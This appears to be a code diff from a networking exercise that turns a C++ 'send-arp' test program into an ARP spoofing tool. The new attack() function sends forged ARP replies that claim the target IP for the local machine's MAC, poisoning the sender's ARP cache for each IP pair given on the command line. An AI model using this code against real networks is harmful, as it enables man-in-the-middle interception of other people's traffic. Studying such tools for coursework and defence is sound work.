@@ -12,8 +12,8 @@ struct EthArpPacket final {
 #pragma pack(pop)
 
 void usage() {
-	printf("syntax: send-arp-test <interface> \n");
-	printf("sample: send-arp-test wlan0\n");
+	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
+	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
 }
 using namespace std;
 
@@ -108,13 +108,7 @@ void send_arp(
 
 }
 
-int main(int argc, char* argv[]) {
-	if (argc != 2) {
-    usage();
-    return -1;
-	}
-
-	char* dev = argv[1];
+int attack(char *dev, char *_target_ip, char *_sender_ip) {
 	char errbuf[PCAP_ERRBUF_SIZE];
   
   pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
@@ -125,22 +119,29 @@ int main(int argc, char* argv[]) {
   }
 
   Mac current_mac = get_current_mac(dev);
-  cout << string(current_mac) << '\n';
   Ip current_ip = get_current_ip(dev);
-  cout << string(current_ip) << '\n';
   
-  Ip target_ip = Ip("192.168.55.1");
-  Ip sender_ip = Ip("192.168.55.168");
-
-  // Mac target_mac = get_mac_by_ip(handle, current_mac, current_ip, target_ip);
-  // cout << string(target_mac) << '\n';
+  Ip target_ip = Ip(_target_ip);
+  Ip sender_ip = Ip(_sender_ip);
 
   Mac sender_mac = get_mac_by_ip(handle, current_mac, current_ip, sender_ip);
-  cout << string(sender_mac) << '\n';
   
   send_arp(handle, current_mac, sender_mac, current_mac, target_ip, sender_mac, sender_ip, ArpHdr::Reply);
   
-  pcap_close(pcap_handle);
-  
+  pcap_close(handle);
+}
+
+int main(int argc, char* argv[]) {
+	if (argc < 4 || argc % 2 != 0) {
+    usage();
+    return -1;
+	}
+
+	char* dev = argv[1];
+  printf("%d\n", argc);
+  for (int i = 2; i < argc; i += 2) {
+    attack(dev, argv[i], argv[i + 1]);
+  }
+
   return 1;
 }
